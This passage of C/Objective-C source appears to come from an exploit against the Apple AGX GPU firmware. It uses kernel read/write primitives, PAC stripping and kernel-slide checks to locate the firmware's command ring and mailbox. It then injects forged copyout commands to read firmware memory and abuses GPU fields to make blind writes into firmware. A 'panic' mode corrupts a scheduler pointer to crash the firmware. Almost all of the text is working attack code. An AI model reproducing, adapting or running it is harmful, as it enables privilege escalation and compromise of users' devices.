        uint64_t search_start = gpu_base + COPYOUT_MIN_OFFSET;
        uint64_t candidate = COPYOUT_TABLE;
        if (candidate < search_start) {
            uint64_t delta = search_start - candidate;
            candidate += ((delta + COPYOUT_STRIDE - 1) / COPYOUT_STRIDE) * COPYOUT_STRIDE;
        }

        for (; candidate <= end - sizeof(first); candidate += COPYOUT_STRIDE) {
            uint64_t index = (candidate - COPYOUT_TABLE) / COPYOUT_STRIDE;
            if (candidate < COPYOUT_TABLE || index > UINT32_MAX) continue;
            uint64_t alias = cpu_base + candidate - gpu_base;
            if (!read_kernel(alias, first, sizeof(first))) continue;
            usleep(10000);
            if (!read_kernel(alias, second, sizeof(second)) ||
                memcmp(first, second, sizeof(first)) != 0 ||
                !all_zero(first, sizeof(first))) continue;

            context->output_gpu_base = gpu_base;
            context->output_cpu_base = cpu_base;
            context->output_length = length;
            context->output_entries[0] = candidate;
            context->output_entries[1] = candidate + COPYOUT_STRIDE;
            LOG("GFX copyout output field=%#llx gfx=%#llx cpu=%#llx entries=%#llx/%#llx",
                map_fields[field_index], gpu_base, cpu_base,
                context->output_entries[0], context->output_entries[1]);
            return true;
        }
    }
    LOG_ERR("no stable zeroed GFX copyout entries found");
    return false;
}

static bool resolve_device_channel(read_context_t* context) {
    const char* stage = "channel";
    uint64_t channel = 0;
    uint64_t endpoint = 0;
    uint64_t transport = 0;
    uint64_t mailbox = 0;
    uint8_t active = 0;
    if (!read_pointer(context->firmware + DEVICE_CONTROL_CHANNEL_OFFSET, &channel)) goto failure;
    stage = "endpoint";
    if (!read_pointer(channel + DEVICE_CONTROL_ENDPOINT_OFFSET, &endpoint)) goto failure;
    stage = "endpoint-state";
    if (!read8(endpoint + 0x28, &active) || active != 1 ||
        !read32(endpoint + 0x88, &context->endpoint) || context->endpoint == 0) goto failure;
    stage = "transport";
    if (!read_pointer(endpoint + 0x48, &transport)) goto failure;
    stage = "mailbox";
    if (!read_pointer(transport + 0xb0, &mailbox)) goto failure;
    stage = "inbox";
    if (!read_pointer(mailbox + 0x100, &context->inbox)) goto failure;
    LOG("GFX device channel field=%#llx channel=%#llx endpoint=%u inbox=%#llx",
        DEVICE_CONTROL_CHANNEL_OFFSET, channel, context->endpoint, context->inbox);
    return true;

failure:
    LOG_ERR("device-control channel gate failed at %s channel=%#llx endpoint=%#llx active=%u id=%u transport=%#llx mailbox=%#llx",
        stage, channel, endpoint, active, context->endpoint, transport, mailbox);
    return false;
}

static bool resolve_read_context(const drop_context_t* drop, read_context_t* context) {
    memset(context, 0, sizeof(*context));
    uint64_t firmware_vtable_raw = 0;
    if (!read_pointer(drop->gpu + 0x548, &context->firmware) ||
        !read64(context->firmware, &firmware_vtable_raw) ||
        strip_pac(firmware_vtable_raw) != AGX_FIRMWARE_G17P_VTABLE + g_ctx.kernel_slide) {
        LOG_ERR("AGX firmware-object gate failed");
        return false;
    }

    uint64_t ring = context->firmware + DEVICE_CONTROL_RING_OFFSET;
    uint64_t ring_vtable_raw = 0;
    if (!read64(ring, &ring_vtable_raw) ||
        strip_pac(ring_vtable_raw) != DEVICE_CONTROL_RING_VTABLE + g_ctx.kernel_slide ||
        !read_pointer(ring + 0x08, &context->index_block) ||
        !read_pointer(ring + 0x18, &context->ring_buffer) ||
        !resolve_device_channel(context)) {
        LOG_ERR("device-control ring gate failed");
        return false;
    }

    if (!resolve_firmware_map(drop, context->firmware, 0x4f8, &context->main_gpu_base,
        &context->main_cpu_base, &context->main_length) ||
        context->main_gpu_base > FIRMWARE_START ||
        FIRMWARE_START - context->main_gpu_base > context->main_length ||
        FIRMWARE_END - FIRMWARE_START >
            context->main_length - (FIRMWARE_START - context->main_gpu_base) ||
        !find_copyout_output(drop, context)) {
        return false;
    }
    LOG("GFX copyout ring=%#llx indices=%#llx buffer=%#llx", ring,
        context->index_block, context->ring_buffer);
    return true;
}

static uint64_t output_alias(const read_context_t* context, uint64_t gfx_address) {
    if (gfx_address < context->output_gpu_base ||
        gfx_address - context->output_gpu_base >= context->output_length) return 0;
    return context->output_cpu_base + gfx_address - context->output_gpu_base;
}

static uint64_t main_alias(const read_context_t* context, uint64_t gfx_address, size_t size) {
    if (gfx_address < context->main_gpu_base || size > context->main_length ||
        gfx_address - context->main_gpu_base > context->main_length - size) return 0;
    return context->main_cpu_base + gfx_address - context->main_gpu_base;
}

static bool wait_for_empty_ring(const read_context_t* context, uint8_t* index) {
    for (unsigned attempt = 0; attempt < 1000; attempt++) {
        uint8_t read_index = 0;
        uint8_t write_index = 0;
        if (!read8(context->index_block, &read_index) ||
            !read8(context->index_block + 0x20, &write_index)) return false;
        if (read_index == write_index) {
            usleep(1000);
            uint8_t stable_read = 0;
            uint8_t stable_write = 0;
            if (read8(context->index_block, &stable_read) &&
                read8(context->index_block + 0x20, &stable_write) &&
                stable_read == read_index && stable_write == write_index) {
                *index = write_index;
                return true;
            }
        }
        usleep(1000);
    }
    return false;
}

static bool ring_firmware(const read_context_t* context) {
    uint64_t note[2] = {FIRMWARE_ASYNC_NOTE, context->endpoint};
    __sync_synchronize();
    return early_kwrite_checked(context->inbox + 0x8800, note, sizeof(note));
}

static bool submit_copyout(const read_context_t* context, uint64_t source,
    uint64_t entry, uint64_t marker, uint32_t* value) {
    if (entry < COPYOUT_TABLE) return false;
    uint64_t delta = entry - COPYOUT_TABLE;
    uint64_t index64 = delta / COPYOUT_STRIDE;
    if (delta % COPYOUT_STRIDE != 0 || index64 > UINT32_MAX) return false;

    uint8_t ring_index = 0;
    if (!wait_for_empty_ring(context, &ring_index)) return false;
    uint8_t command[0x40] = {};
    uint8_t original[0x40] = {};
    uint64_t slot = context->ring_buffer + (uint64_t)ring_index * sizeof(command);
    uint8_t next = (uint8_t)(ring_index + 1);
    uint64_t pointer = source - 0x10;
    uint32_t index = (uint32_t)index64;
    uint32_t enter = 1;
    memcpy(command, &(uint32_t){COPYOUT_COMMAND}, sizeof(uint32_t));
    memcpy(command + 0x0c, &marker, sizeof(marker));
    memcpy(command + 0x14, &pointer, sizeof(pointer));
    memcpy(command + 0x30, &index, sizeof(index));
    memcpy(command + 0x34, &enter, sizeof(enter));

    if (!read_kernel(slot, original, sizeof(original)) || !write_kernel(slot, command, sizeof(command)) ||
        !write8(context->index_block + 0x20, next)) {
        return false;
    }

    bool advanced = false;
    bool copied = false;
    if (ring_firmware(context)) {
        for (unsigned poll = 0; poll < 5000; poll++) {
            uint8_t read_index = ring_index;
            if (!read8(context->index_block, &read_index)) break;
            if (read_index != ring_index) {
                advanced = true;
                uint64_t alias = output_alias(context, entry + COPYOUT_RESULT);
                copied = alias && read32(alias, value);
                break;
            }
            usleep(1000);
        }
    }

    uint8_t read_after = ring_index;
    uint8_t write_after = next;
    (void)read8(context->index_block, &read_after);
    (void)read8(context->index_block + 0x20, &write_after);
    if (!advanced && read_after == ring_index && write_after == next) {
        (void)write8(context->index_block + 0x20, ring_index);
        write_after = ring_index;
    }
    bool restored = false;
    if (advanced || (read_after == ring_index && write_after == ring_index)) {
        restored = write_kernel(slot, original, sizeof(original));
    }
    LOG("GFX copyout source=%#llx ring=%u->%u value=%#x consumed=%u restored=%u",
        source, ring_index, read_after, *value, advanced, restored);
    return copied && restored;
}

static bool copyout_read64(const read_context_t* context, uint64_t source, uint64_t* value) {
    uint32_t words[2] = {COPYOUT_SENTINEL, COPYOUT_SENTINEL};
    for (unsigned pass = 0; pass < 2; pass++) {
        uint64_t entry = context->output_entries[pass];
        uint64_t alias = output_alias(context, entry);
        uint8_t original[COPYOUT_STRIDE];
        uint64_t marker = UINT64_C(0x22a1000000000000) | arc4random() | 1;
        if (!alias || !read_kernel(alias, original, sizeof(original)) ||
            !write32(alias + COPYOUT_RESULT, COPYOUT_SENTINEL)) return false;
        bool copied = submit_copyout(context, source + 4 * pass, entry, marker, &words[pass]);
        bool restored = write_kernel(alias, original, sizeof(original));
        if (!copied || !restored) return false;
    }
    *value = (uint64_t)words[0] | ((uint64_t)words[1] << 32);
    return true;
}

static bool run_read_at(const drop_context_t* drop, uint64_t source, const char* label) {
    if (!agx_test_argument_valid(AGX_TEST_READ, source)) {
        LOG_ERR("GFX read requires an aligned main-firmware address in [%#llx, %#llx)",
            FIRMWARE_START + 0x10, FIRMWARE_END - 0x50);
        return false;
    }
    read_context_t context = {};
    if (!resolve_read_context(drop, &context)) return false;
    uint64_t expected = 0;
    uint64_t observed = 0;
    uint64_t source_alias = main_alias(&context, source, sizeof(expected));
    bool copied = source_alias && read64(source_alias, &expected) &&
        copyout_read64(&context, source, &observed);
    bool matched = copied && observed == expected;
    LOG("GFX read %s source=%#llx expected=%#llx observed=%#llx proof=%s",
        label, source, expected, observed, matched ? "verified" : "failed");
    return matched;
}

static bool run_read_control(const drop_context_t* drop) {
    return run_read_at(drop, FIRMWARE_CONTROL_SOURCE, "control");
}

static bool run_read(const drop_context_t* drop, uint64_t source) {
    return run_read_at(drop, source, "requested");
}

static bool drop_scratch_word(const drop_context_t* context, uint32_t word_offset,
                              uint32_t* observed_out) {
    command_buffers_t buffers = {};
    mdsid_allocation_t allocation = {};
    uint64_t map_field = context->device + 0x158;
    uint64_t fence_field = context->gpu + 0x18120;
    uint64_t offset_field = context->gpu + 0x540;
    uint64_t original_map = 0;
    uint32_t original_fence = 0;
    uint32_t original_offset = 0;
    uint16_t original_entry = 0;
    bool changed_map = false;
    bool changed_entry = false;
    bool changed_fence = false;
    bool changed_offset = false;
    bool written = false;

    if (!setup_command_buffers(context->port, &buffers) ||
        !allocate_mdsid_table(context->ipc_table, context->ipc_count, &allocation) ||
        !read64(map_field, &original_map) || !read32(fence_field, &original_fence) ||
        !read32(offset_field, &original_offset) ||
        !read16(allocation.ranges + 0x200, &original_entry)) {
        goto cleanup;
    }

    changed_map = write64(map_field, allocation.ranges);
    changed_entry = changed_map && write16(allocation.ranges + 0x200, 0x0100);
    changed_fence = changed_entry && write32(fence_field, DROP_MARKER - 0x100);
    changed_offset = changed_fence && write32(offset_field, original_offset + word_offset);
    kern_return_t submit_kr = changed_offset ? submit(context->port, &buffers) : KERN_FAILURE;
    uint32_t observed = 0;
    written = submit_kr == KERN_SUCCESS &&
        wait_for32(context->target_cpu + word_offset, DROP_MARKER, &observed);
    if (observed_out) *observed_out = observed;
    LOG("DropMDSID scratch offset=%#x submit=%#x observed=%#x written=%u",
        word_offset, submit_kr, observed, written);

cleanup: {
    bool offset_restored = !changed_offset || write32(offset_field, original_offset);
    bool fence_restored = !changed_fence || write32(fence_field, original_fence);
    bool entry_restored = !changed_entry || write16(allocation.ranges + 0x200, original_entry);
    bool map_restored = !changed_map || write64(map_field, original_map);
    bool restored = offset_restored && fence_restored && entry_restored && map_restored;
    free_mdsid_allocation(&allocation);
    return written && restored;
}
}

static bool run_drop_control(const drop_context_t* context) {
    uint64_t original = 0;
    if (!read64(context->target_cpu, &original) || original != 0) {
        LOG_ERR("DropMDSID scratch is not clean: %#llx", original);
        return false;
    }

    uint32_t high_observed = 0;
    uint32_t low_observed = 0;
    bool high_written = drop_scratch_word(context, sizeof(uint32_t), &high_observed);
    bool low_written = high_written && drop_scratch_word(context, 0, &low_observed);
    uint64_t observed = 0;
    bool proved = high_written && low_written && read64(context->target_cpu, &observed) &&
        observed == DROP_MARKER64;
    bool restored = write64(context->target_cpu, original);
    LOG("DropMDSID control words=%#x/%#x marker=%#llx proof=%s cleanup=%s",
        high_observed, low_observed, observed, proved ? "verified" : "failed",
        restored ? "restored" : "failed");
    return proved && restored;
}

static bool drop_blind_write32(const drop_context_t* context, uint64_t target, uint32_t value) {
    command_buffers_t buffers = {};
    mdsid_allocation_t allocation = {};
    uint64_t map_field = context->device + 0x158;
    uint64_t fence_field = context->gpu + 0x18120;
    uint64_t base_field = context->owner + 0x28;
    uint64_t original_map = 0;
    uint64_t original_base = 0;
    uint32_t original_fence = 0;
    uint16_t original_entry = 0;
    bool changed_map = false;
    bool changed_base = false;
    bool changed_fence = false;
    bool changed_entry = false;
    kern_return_t submit_kr = KERN_FAILURE;

    if (!firmware_pointer(target) || target > FIRMWARE_END - sizeof(value) ||
        !setup_command_buffers(context->port, &buffers) ||
        !allocate_mdsid_table(context->ipc_table, context->ipc_count, &allocation) ||
        !read64(map_field, &original_map) || !read64(base_field, &original_base) ||
        !read32(fence_field, &original_fence) || !read16(allocation.ranges + 0x200, &original_entry)) {
        goto cleanup;
    }

    changed_map = write64(map_field, allocation.ranges);
    changed_entry = changed_map && write16(allocation.ranges + 0x200, 0x0100);
    changed_fence = changed_entry && write32(fence_field, value - 0x100);
    changed_base = changed_fence && write64(base_field, target - context->buffer_offset);
    if (changed_base) submit_kr = submit(context->port, &buffers);

cleanup: {
    bool base_restored = !changed_base || write64(base_field, original_base);
    bool fence_restored = !changed_fence || write32(fence_field, original_fence);
    bool entry_restored = !changed_entry || write16(allocation.ranges + 0x200, original_entry);
    bool map_restored = !changed_map || write64(map_field, original_map);
    bool restored = base_restored && fence_restored && entry_restored && map_restored;
    LOG("DropMDSID blind target=%#llx value=%#x submit=%#x cleanup=%s", target, value,
        submit_kr, restored ? "restored" : "failed");
    free_mdsid_allocation(&allocation);
    return submit_kr == KERN_SUCCESS && restored;
}
}

static bool run_drop_panic(const drop_context_t* context) {
    if (!run_drop_control(context)) {
        LOG_ERR("panic treatment refused: control proof failed");
        return false;
    }

    uint64_t target = SCHEDULER_GLOBAL + sizeof(uint32_t);
    if (!drop_blind_write32(context, target, DROP_MARKER)) {
        LOG_ERR("panic treatment was not submitted");
        return false;
    }

    LOG("panic treatment submitted: scheduler pointer high word at %#llx", target);
    sleep(30);
    bool restored = drop_blind_write32(context, target, UINT32_C(0xfffffc00));
    LOG_ERR("panic did not occur before timeout; firmware cleanup=%s", restored ? "restored" : "failed");
    return false;
}

bool agx_run_test(agx_test_mode_t mode, uint64_t argument) {
    @autoreleasepool {
        if (mode == AGX_TEST_ACQUIRE_ONLY) return true;
        if (mode == AGX_TEST_SHADOW) return agx_shadow_test(g_ctx.self_pmap);

        id<MTLDevice> device = MTLCreateSystemDefaultDevice();
        id<MTLBuffer> keepalive = [device newBufferWithLength:PAGE_SIZE_16K options:MTLResourceStorageModeShared];
        if (!device || !keepalive) {
            LOG_ERR("Metal device setup failed");
            return false;
        }
        usleep(500000);

        drop_context_t context = {};
        if (!resolve_drop_context(&context)) return false;
        switch (mode) {
            case AGX_TEST_READ_CONTROL:
                return run_read_control(&context);
            case AGX_TEST_READ:
                return run_read(&context, argument);
            case AGX_TEST_WRITE_CONTROL:
                return run_drop_control(&context);
            case AGX_TEST_WRITE_PANIC:
                return run_drop_panic(&context);
            case AGX_TEST_ACQUIRE_ONLY:
            case AGX_TEST_SHADOW:
                break;
        }
        return false;
    }
}
